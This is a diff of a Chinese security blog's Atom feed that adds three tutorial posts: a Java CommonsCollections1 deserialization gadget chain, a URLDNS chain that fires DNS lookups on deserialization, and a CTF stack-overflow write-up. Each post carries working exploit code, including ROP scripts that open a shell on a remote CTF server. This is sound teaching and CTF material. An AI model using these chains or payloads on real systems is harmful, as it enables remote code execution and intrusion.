@@ -2,14 +2,613 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://limpid94.github.io</id>
     <title>Limpid</title>
-    <updated>2021-09-21T18:20:04.840Z</updated>
+    <updated>2022-02-16T09:11:21.130Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://limpid94.github.io"/>
     <link rel="self" href="https://limpid94.github.io/atom.xml"/>
     <subtitle>Keep thinking , keeping learning</subtitle>
     <logo>https://limpid94.github.io/images/avatar.png</logo>
     <icon>https://limpid94.github.io/favicon.ico</icon>
-    <rights>All rights reserved 2021, Limpid</rights>
+    <rights>All rights reserved 2022, Limpid</rights>
+    <entry>
+        <title type="html"><![CDATA[【Java反序列化】CommonCollections1利用链]]></title>
+        <id>https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections1-li-yong-lian/</id>
+        <link href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections1-li-yong-lian/">
+        </link>
+        <updated>2022-02-11T06:12:30.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="基础">基础</h2>
+<h3 id="transformer">Transformer</h3>
+<p>其为接口，只有一个<code>transform</code>接口，后续若被继承则需实现该接口。</p>
+<h3 id="constanttransformer">ConstantTransformer</h3>
+<p>该类继承了Transformer接口，并在<code>transform</code>方法中返回了由构造方法传入的类。</p>
+<pre><code class="language-java">public ConstantTransformer(Object constantToReturn) {
+        this.iConstant = constantToReturn;
+    }
+
+public Object transform(Object input) {
+    return this.iConstant;
+}
+</code></pre>
+<h3 id="invokertransformer">InvokerTransformer</h3>
+<p>在<code>transform</code>中利用反射调用传入某个类的方法，而调用的方法和所需的参数则在构造函数中完成赋值。最终完成该方法的执行结果。</p>
+<h3 id="chainedtransformer">ChainedTransformer</h3>
+<p>该类通过循环的方式调用传入的transformers数组的transform方法，并将上一次的循环结果带入下一个循环中。</p>
+<h2 id="commonscollections1利用链的构造">CommonsCollections1利用链的构造</h2>
+<p>首先最关键的是危险方法的调用。在JAVA中执行系统命令的都是Runtime类，但是Runtime类没有继承Serializable类，无法进行 序列化操作。于是需要被反射调用。</p>
+<h3 id="构造过程">构造过程</h3>
+<p>首先看到InvokerTransformer，其transform方法代码如下</p>
+<pre><code class="language-java"> public Object transform(Object input) {
+        if (input == null) {
+            return null;
+        }
+        try {
+            Class cls = input.getClass();
+            Method method = cls.getMethod(iMethodName, iParamTypes);
+            return method.invoke(input, iArgs);
+                
+        } catch (NoSuchMethodException ex) {
+            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' does not exist&quot;);
+        } catch (IllegalAccessException ex) {
+            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' cannot be accessed&quot;);
+        } catch (InvocationTargetException ex) {
+            throw new FunctorException(&quot;InvokerTransformer: The method '&quot; + iMethodName + &quot;' on '&quot; + input.getClass() + &quot;' threw an exception&quot;, ex);
+        }
+</code></pre>
+<p>其主要的作用就是反射调用传入的方法，于是可以利用其调用Runtime达到命令执行的效果。（此处先不论Runtime无法序列化的问题）。</p>
+<pre><code class="language-java">package cc.commonscollections.test;
+
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+public class Test {
+    public static void main(String[] args) {
+
+        Runtime r = Runtime.getRuntime();
+        new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;}).transform(r);
+    }
+}
+</code></pre>
+<p>然后查找哪里调用了该类的transform或者有同名方法的类：<br>
+<img src="https://limpid94.github.io/post-images/1644741115597.PNG" alt="" loading="lazy"><br>
+其中 org/apache/commons/collections/map/TransformedMap.java中的checkSetValue调用了关键方法：</p>
+<pre><code class="language-java">    protected Object checkSetValue(Object value) {
+        return valueTransformer.transform(value);
+    }
+</code></pre>
+<p>继续查找哪里调用了checkSetValue，其中一个结果是org/apache/commons/collections/map/AbstractInputCheckedMapDecorator.java的setValue</p>
+<pre><code class="language-java">        public Object setValue(Object value) {
+            value = parent.checkSetValue(value);
+            return entry.setValue(value);
+        }
+</code></pre>
+<p>此处的setValue是属于AbstractInputCheckedMapDecorator类的静态类MapEntry：</p>
+<pre><code class="language-java">static class MapEntry extends AbstractMapEntryDecorator {
+
+        /** The parent map */
+        private final AbstractInputCheckedMapDecorator parent;
+
+        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
+            super(entry);
+            this.parent = parent;
+        }
+
+        public Object setValue(Object value) {
+            value = parent.checkSetValue(value);
+            return entry.setValue(value);
+        }
+    }
+</code></pre>
+<p>到此处需要理解一下TransformedMap是怎么调用到 AbstractInputCheckedMapDecorator的MapEntry的setValue。</p>
+<p>从代码得知，<code>TransformedMap</code>的<code>decorate</code>创建的该类的实例，并将<code>decorate</code>方法的参数<code>map</code>作为调用父类<code>AbstractInputCheckedMapDecorator</code>的构造函数时所传入的参数，并将<code>decorate</code>方法的第三个参数<code>valueTransformer</code>作为<code>this.valueTransformer</code>变量<br>
+于是需要有个Map.Entry的循环调用来进行触发：</p>
+<pre><code class="language-java">Runtime r = Runtime.getRuntime();
+InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;});
+
+HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();
+hashMap.put(&quot;123&quot;,&quot;456&quot;);
+
+Map transformedMap = TransformedMap.decorate(hashMap,null, invokerTransformer);
+for(Map.Entry entry:transformedMap.entrySet()){
+     entry.setValue(r);
+ }
+</code></pre>
+<p><img src="https://limpid94.github.io/post-images/1644856931555.PNG" alt="" loading="lazy"><br>
+目前已经完成一半，接下来继续查找何处有类似的循环并且调用了setValue。<br>
+在<code>AnnotationInvocationHandler</code>中的<code>readObject</code>有类似的调用：</p>
+<pre><code class="language-java">    private void readObject(java.io.ObjectInputStream s)
+        throws java.io.IOException, ClassNotFoundException {
+        s.defaultReadObject();
+
+        // Check to make sure that types have not evolved incompatibly
+
+        AnnotationType annotationType = null;
+        try {
+            annotationType = AnnotationType.getInstance(type);
+        } catch(IllegalArgumentException e) {
+            // Class is no longer an annotation type; time to punch out
+            throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);
+        }
+</code></pre>
+<p>但是这个类不是public的，无法直接调用，需要用反射直接加载<br>
+<img src="https://limpid94.github.io/post-images/1644993923128.PNG" alt="" loading="lazy"></p>
+<pre><code class="language-java">Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+</code></pre>
+<p>然后根据类来实例化构造函数</p>
+<pre><code class="language-java">Constructor constructor =  c.getDeclaredConstructor(Class.class, Map.class);
+constructor.setAccessible(true);
+InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class,transformedMap);
+</code></pre>
+<p>值得注意的是，此处的Target注解是因为注解中含有一个ElementType的值</p>
+<pre><code class="language-java">public @interface Target {
+    /**
+     * Returns an array of the kinds of elements an annotation type
+     * can be applied to.
+     * @return an array of the kinds of elements an annotation type
+     * can be applied to
+     */
+    ElementType[] value();
+}
+</code></pre>
+<p>这样在AnnotationInvocationHandler的readObject中才能顺利通过<code>if (memberType != null)</code> 进而执行到<code>memberValue.setValue()</code>。<br>
+<img src="https://limpid94.github.io/post-images/1644997316542.PNG" alt="" loading="lazy"><br>
+若换成<code>Overwirte</code>注解则会失败，原因在于其没有任何值。<br>
+<img src="https://limpid94.github.io/post-images/1644998716000.PNG" alt="" loading="lazy"><br>
+当然到此处依然还没结束，因为Runtime不能被序列化的问题还没解决。</p>
+<h3 id="构造可以被序列化的runtime类">构造可以被序列化的Runtime类</h3>
+<p>在Java中利用反射调有以下三种方式<br>
+1、类名.class</p>
+<pre><code class="language-java">    Runtime.class
+</code></pre>
+<p>2、实例名.getClass</p>
+<pre><code class="language-java">    Runtime runtime = new Runtime();
+    runtime.getClass;
+</code></pre>
+<p>3、通过类的完整路径获取</p>
+<pre><code class="language-java">    Class.forName(&quot;.......&quot;);
+</code></pre>
+<p>第二种显然没办法将Runtime进行序列化，但是第一种实际上是生成一个Class类，而Class类是可以被序列化的<br>
+<img src="https://limpid94.github.io/post-images/1644999039435.PNG" alt="" loading="lazy"><br>
+于是这里使用ConstantTransformer+InvokerTransformer来组成反射调用的链：</p>
+<pre><code class="language-java">        //相当于Runtime.getRuntime().exec(&quot;calc&quot;);
+        Transformer[] transformer = new Transformer[]{
+                //用反射的方法调用Runtime对象
+                new ConstantTransformer(Runtime.class),
+                //用反射中的getMethod方法来获取Method对象
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                //用invoke执行getRuntime
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                //调用exec方法并传入要执行的命令
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[]{String.class},
+                        new Object[]{&quot;calc.exe&quot;}
+                        )
+        };
+</code></pre>
+<p>然后使用ChainedTransformer将上述链串起来，并方便TransformedMap.decorate调用。<br>
+##完整调用</p>
+<pre><code class="language-java">package cc.commonscollections;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+//import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CommonCollections1Demo {
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
+        Transformer[] transformer = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class}, new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class}, new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[]{String.class},
+                        new Object[]{&quot;calc.exe&quot;}
+                        )
+        };
+
+        Transformer ctf = new ChainedTransformer(transformer);
+        Map map1 = new HashMap();
+        map1.put(&quot;value&quot;,&quot;123&quot;);
+        Map map2 = TransformedMap.decorate(map1,null,ctf);
+
+        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        //获取构造函数
+        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class,map2);
+//        mySeriable(invocationHandler);
+        myDeseriable();
+
+    }
+
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static Object myDeseriable() throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));
+        return ois.readObject();
+    }
+}
+
+</code></pre>
+<h2 id="参考材料">参考材料</h2>
+<p>[1] http://drops.xmd5.com/static/drops/papers-13244.html<br>
+[2] https://zhuanlan.zhihu.com/p/350058223<br>
+[3] https://www.freebuf.com/articles/web/312175.html<br>
+[4] http://121.40.251.109/2021/07/16/2021-7-16-ysoserial%E7%B3%BB%E5%88%97-CommonsCollections1%E9%93%BE%E5%88%86%E6%9E%90/</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[【JAVA反序列化】URLDNS利用链]]></title>
+        <id>https://limpid94.github.io/post/java-fan-xu-lie-hua-dui-urldns-de-xue-xi/</id>
+        <link href="https://limpid94.github.io/post/java-fan-xu-lie-hua-dui-urldns-de-xue-xi/">
+        </link>
+        <updated>2022-02-07T04:36:42.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="java反序列化漏洞存在的形式">Java反序列化漏洞存在的形式</h2>
+<p>1、入口类的readObject存在危险方法调用行为。（A类中直接存在危险方法）<br>
+2、入口类的readObject使用的参数包含可控类，可控类存在危险方法。（A类中间接调用危险方法）<br>
+3、入口类的readObject调用了可控类，而该类又调用了其他的危险方法类。（A类中调用B类，B类又调用其他危险方法）<br>
+4、构造函数/静态代码块等加载时隐式执行。</p>
+<h2 id="java反序列化利用链的查找思路">JAVA反序列化利用链的查找思路</h2>
+<p>首先查找的类必须继承Serializable，其次在查找入口类时需要满足重写readObject、参数类型宽泛和所查找的类最好来自于JDK。</p>
+<h2 id="urldns">URLDNS</h2>
+<h3 id="urldns如何触发dns请求原理">URLDNS如何触发DNS请求原理</h3>
+<p>通过查找资料，得知该调用链的调用情况如下：</p>
+<pre><code> *   Gadget Chain:
+ *     HashMap.readObject()
+ *       HashMap.putVal()
+ *         HashMap.hash()
+ *           URL.hashCode()
+</code></pre>
+<p>在<code>URL.hashCode()</code>中调用了<code>handler.hashCode()</code></p>
+<pre><code class="language-java">    public synchronized int hashCode() {
+        if (hashCode != -1)
+            return hashCode;
+
+        hashCode = handler.hashCode(this);
+        return hashCode;
+    }
+</code></pre>
+<p>此处的handler是URLStreamHandler类，其中的hashCode()代码如下</p>
+<pre><code class="language-java">    protected int hashCode(URL u) {
+        int h = 0;
+
+        // Generate the protocol part.
+        String protocol = u.getProtocol();
+        if (protocol != null)
+            h += protocol.hashCode();
+
+        // Generate the host part.
+        InetAddress addr = getHostAddress(u);
+        if (addr != null) {
+            h += addr.hashCode();
+        } else {
+            String host = u.getHost();
+            if (host != null)
+                h += host.toLowerCase().hashCode();
+        }
+        ......
+</code></pre>
+<p>这里调用<code>getHostAddress</code>方法又会将传入的url交给<code>InetAddress.getByName()</code>方法：</p>
+<pre><code class="language-java">    protected synchronized InetAddress getHostAddress(URL u) {
+        if (u.hostAddress != null)
+            return u.hostAddress;
+
+        String host = u.getHost();
+        if (host == null || host.equals(&quot;&quot;)) {
+            return null;
+        } else {
+            try {
+                u.hostAddress = InetAddress.getByName(host);
+            } catch (UnknownHostException ex) {
+                return null;
+            } catch (SecurityException se) {
+                return null;
+            }
+        }
+        return u.hostAddress;
+    }
+</code></pre>
+<p>该方法会返回所提供的域名对应的IP，因此在此处会产生一次域名查询。</p>
+<h3 id="urldns反序列化链的构建">URLDNS反序列化链的构建</h3>
+<p>由于URL中的handler是被transient修饰的URLStreamHandler类的对象，因此在序列化时不会写入序列化的结果中，并且在writeObject方法中没有其他的特色处理（如下两张图），因此直接序列化是行不通的<br>
+<img src="https://limpid94.github.io/post-images/1644329621179.PNG" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1644329704713.PNG" alt="" loading="lazy"></figure>
+<p>于是需要查找其他的入口类中调用了hashCode方法的类。<br>
+在本文开头处提到，查找的时候最好找具有三个特点地类（重写readObject、参数类型宽泛和JDK自带）。于是HashMap类就比较符合。HashMap为了保证在不同版本中的hash值的唯一性，重新定义了自己的hashCode计算方法并且重写了readObject方法。</p>
+<p>在<code>HashMap的readObject</code>方法中循环从流中读取<code>key</code>和<code>value</code>的值并用<code>putVal</code>来放入map中，并且调用<code>hash()</code>来计算哈希值。<br>
+<img src="https://limpid94.github.io/post-images/1644332524763.PNG" alt="" loading="lazy"><br>
+追入hash()，看到具体源码：<br>
+<img src="https://limpid94.github.io/post-images/1644332622063.PNG" alt="" loading="lazy"><br>
+若传入的key为URL类，则key.hashCode()则调用了URL类的hashCode方法。<br>
+于是大致可以新建一个HashMap的示例并放入key为URL的示例，value为任意内容（此处为Integer）</p>
+<pre><code class="language-java">import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.net.URL;
+import java.util.HashMap;
+
+public class MyURLDNS {
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static void main(String[] args) throws IOException {
+        HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;&gt;();
+        hashmap.put(new URL(&quot;http://13bf5a54.dns.1433.eu.org&quot;),123);
+        serialize(hashmap);
+    }
+
+}
+</code></pre>
+<p>但是这样会有个问题，在反序列化过程中由于hashCode已经有值了，于是直接返回hashCode，不会再调用hash方法进行计算，因此无法触发DNS查询。<br>
+为了避免这个现象，需要使用反射的方式来修改hashCode的值<br>
+于是main函数部分变成：</p>
+<pre><code class="language-java">    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
+        HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;&gt;();
+        URL u = new URL(&quot;http://93284a7e.dns.1433.eu.org&quot;);
+        hashmap.put(u,123);
+
+        Field field = URL.class.getDeclaredField(&quot;hashCode&quot;);
+        field.setAccessible(true);
+        field.set(u,-1);
+
+        serialize(hashmap);
+</code></pre>
+<p>但是还是存在一个问题，序列化时就会产生DNS请求，干扰测试结果。<br>
+为了解决该问题，ysoserial中的解决办法就是自己写一个hander类，将<code>openConnection</code>和<code>getHostAddress</code>改写成返回null的操作。</p>
+<pre><code class="language-java">//自己实现的URLStreamHandler类
+    static class MyURLStreamHandler extends URLStreamHandler {
+
+        @Override
+        protected URLConnection openConnection(URL u) throws IOException {
+            return null;
+        }
+
+        @Override
+        protected synchronized InetAddress getHostAddress(URL u) {
+            return null;
+        }
+    }
+
+</code></pre>
+<p>然后修改main方法中的部分代码：</p>
+<pre><code class="language-java">    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
+        HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;&gt;();
+        URLStreamHandler handler = new MyURLStreamHandler();
+        URL u = new URL( null,&quot;http://99efe118.dns.1433.eu.org&quot;, handler);
+        hashmap.put(u,123);
+
+        Field field = URL.class.getDeclaredField(&quot;hashCode&quot;);
+        field.setAccessible(true);
+        field.set(u,-1);
+
+        serialize(hashmap);
+</code></pre>
+<p>此时序列化时就不会产生DNS查询。<br>
+当执行反序列化时，就会产生DNS查询，达到目的</p>
+<pre><code class="language-java">import java.io.*;
+import java.lang.reflect.Field;
+import java.net.InetAddress;
+import java.net.URL;
+import java.net.URLConnection;
+import java.net.URLStreamHandler;
+import java.util.HashMap;
+
+public class MyURLDNS {
+    public static void serialize(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
+        HashMap&lt;URL,Integer&gt; hashmap = new HashMap&lt;&gt;();
+        URLStreamHandler handler = new MyURLStreamHandler();
+        URL u = new URL( null,&quot;http://99efe118.dns.1433.eu.org&quot;, handler);
+        hashmap.put(u,123);
+
+        Field field = URL.class.getDeclaredField(&quot;hashCode&quot;);
+        field.setAccessible(true);
+        field.set(u,-1);
+
+        serialize(hashmap);
+
+        //反序列化
+
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));
+        ois.readObject();
+    }
+
+    static class MyURLStreamHandler extends URLStreamHandler {
+
+        @Override
+        protected URLConnection openConnection(URL u) throws IOException {
+            return null;
+        }
+
+        @Override
+        protected synchronized InetAddress getHostAddress(URL u) {
+            return null;
+        }
+    }
+
+}
+
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://limpid94.github.io/post-images/1644395901500.PNG" alt="" loading="lazy"></figure>
+<h2 id="参考材料">参考材料</h2>
+<p>《Java反序列化漏洞学习 Commons Collection》https://tttang.com/archive/1337/<br>
+《深入了解序列化writeObject、readObject、readResolve》https://blog.csdn.net/Leon_cx/article/details/81517603<br>
+《URLDNS利用链分析》https://johnfrod.top/%E5%AE%89%E5%85%A8/urldns%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[【PWN】Linux栈溢出——ret2csu（XCTF2015-PWN100)]]></title>
+        <id>https://limpid94.github.io/post/pwn-linux-zhan-yi-chu-ret2csuxctf2015-pwn100/</id>
+        <link href="https://limpid94.github.io/post/pwn-linux-zhan-yi-chu-ret2csuxctf2015-pwn100/">
+        </link>
+        <updated>2021-09-23T04:12:55.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="程序逆向及漏洞分析">程序逆向及漏洞分析</h2>
+<p>main函数的内容如下：</p>
+<pre><code class="language-c">int __cdecl main()
+{
+  char buf[108]; // [esp+2Ch] [ebp-6Ch] BYREF
+
+  strcpy(buf, &quot;Welcome to XDCTF2015~!\n&quot;);
+  memset(&amp;buf[24], 0, 0x4Cu);
+  setbuf(stdout, buf);
+  write(1, buf, strlen(buf));
+  sub_8048484();
+  return 0;
+}
+</code></pre>
+<pre><code class="language-c">ssize_t sub_8048484()
+{
+  char buf[108]; // [esp+1Ch] [ebp-6Ch] BYREF
+
+  setbuf(stdin, buf);
+  return read(0, buf, 0x100u);
+}
+</code></pre>
+<p>可以看到在sub_8048484中read函数读入0x100大小的字符，而buf只有108个字符，因此猜测存在栈溢出。</p>
+<h2 id="安全检查">安全检查</h2>
+<figure data-type="image" tabindex="1"><img src="https://limpid94.github.io/post-images/1632371042409.PNG" alt="" loading="lazy"></figure>
+<h2 id="偏移计算">偏移计算</h2>
+<p>从sub_8048484函数的buf长度时108可以知道，padding长度位108+fack_ebp(4) = 112</p>
+<h2 id="构造exp">构造EXP</h2>
+<h3 id="方法一使用ret2libc的常见思路">方法一：使用ret2libc的常见思路</h3>
+<p>这里使用正常的ROP思路：<br>
+第一步：泄露write函数的地址<br>
+第二步：通过write函数的地址使用LibcSearcher查找对应的libc版本<br>
+第三步：计算libc基址<br>
+第四步：计算出system函数和read函数的的真实地址<br>
+第五步：先使用read函数将/bin/sh函数读入bss段中，再将其送入system函数中<br>
+因此完整的exp如下：</p>
+<pre><code class="language-python"># coding:utf-8
+
+from pwn import * 
+from LibcSearcher import *
+
+# context.log_level = 'debug'
+p = process(&quot;./xctf2015pwn200&quot;))
+elf = ELF(&quot;./xctf2015pwn200&quot;)
+
+main_addr = 0x080484BE
+write_got = elf.got['write']
+write_plt = elf.plt['write']
+read_got = elf.got['read']
+read_plt = elf.plt['read']
+bss_addr = elf.bss()+0x100
+pop_ebx_addr = 0x0804836c
+
+
+log.success('  main_addr ==&gt; '+ hex(main_addr))
+log.success('  write_got ==&gt; '+ hex(write_got))
+log.success('  write_plt ==&gt; '+ hex(write_plt))
+log.success('  read_got ==&gt; '+ hex(read_got))
+log.success('  read_plt ==&gt; '+ hex(read_plt))
+log.success('  bss_addr ==&gt; '+ hex(bss_addr))
+
+
+# Using normal ROP
+##*********************************************
+## leaking write address to search libc version.
+##*********************************************
+payload = b'A'*112  
+payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
+p.recvuntil('!\n')
+p.send(payload)
+write_addr = u32(p.recv(4))
+log.success('write_addr ==&gt; '+hex(write_addr))
+
+payload = b'A'*112 
+payload += p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(4) p.recvuntil('!\n')
+p.send(payload)
+read_addr = u32(p.recv(4))
+log.success('read_addr ==&gt; '+hex(read_addr))
+
+libc = LibcSearcher('write',write_addr)
+libc.add_condition('read',read_addr)
+
+libc_base = write_addr - libc.dump('write')
+log.success('libc_base ==&gt; '+hex(libc_base))
+gets_addr = libc_base + libc.dump('gets')
+log.info('gets_addr ===&gt; '+hex(gets_addr))
+system_addr = libc_base + libc.dump('system')
+log.info('system_addr ===&gt; '+hex(system_addr))
+##******************************************************************
+## read /bin/sh into bss segment area and use system to execute it
+##******************************************************************
+read_addr = libc_base + libc.dump('read')
+log.success('read_addr ==&gt; '+hex(read_addr))
+payload = b'A'*112 
+payload += p32(read_addr) + p32(system_addr) + p32(0) + p32(bss_addr) + p32(8)
+payload += p32(bss_addr) + p32(0xdeadbeef) + p32(bss_addr)
+p.recvuntil('!\n')
+p.send(payload)
+p.sendline('/bin/sh\x00')
+
+p.interactive()
+</code></pre>
+<p>在本地复现成功了<br>
+<img src="https://limpid94.github.io/post-images/1632371993642.PNG" alt="" loading="lazy"><br>
+但是在远程环境下就复现失败了：<br>
+<img src="https://limpid94.github.io/post-images/1632372027668.PNG" alt="" loading="lazy"><br>
+原因是没办法使用LibcSearcher找到远端使用的libc.因此改用DynELF</p>
+<pre><code class="language-python">#coding:utf-8
+from pwn import *
+
+# context.log_level = 'debug'
+# r = process('./xctf2015pwn200')
+r = remote('111.200.241.244', 57161)
+elf = ELF('./xctf2015pwn200')
+
+main_addr = 0x080484BE
+write_got = elf.got['write']
+write_plt = elf.plt['write']
+read_got = elf.got['read']
+read_plt = elf.plt['read']
+bss_addr = elf.bss()+0x100
+
+log.success('  main_addr ==&gt; '+ hex(main_addr))
+log.success('  write_got ==&gt; '+ hex(write_got))
+log.success('  write_plt ==&gt; '+ hex(write_plt))
+log.success('  read_got ==&gt; '+ hex(read_got))
+log.success('  read_plt ==&gt; '+ hex(read_plt))
+log.success('  bss_addr ==&gt; '+ hex(bss_addr))
+
+def leak(address):
+    payload0 = 'A'*112
+    payload0 += p32(write_plt) + p32(0x80483d0) + p32(1) + p32(address) + p32(4)
+    r.recvuntil('!\n')
+    r.send(payload0)
+    data = r.recv(4)
+    return data
+d = DynELF(leak,elf = ELF('xctf2015pwn200'))
+system_addr = d.lookup('system','libc')
+log.success(' system_addr ==&gt; '+hex(system_addr))
+
+log.info(' Start to getshell ... ')
+payload = 'A'*112
+payload += p32(read_plt) + p32(system_addr) + p32(0) + p32(bss_addr) + p32(8) + p32(0xdeadbeef) + p32(bss_addr)
+r.recvuntil('!\n')
+r.send(payload)
+r.send('/bin/sh\x00')
+
+r.interactive()
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[【PWN】Linux栈溢出——ret2csu]]></title>
         <id>https://limpid94.github.io/post/pwn-linux-zhan-yi-chu-ret2csu/</id>
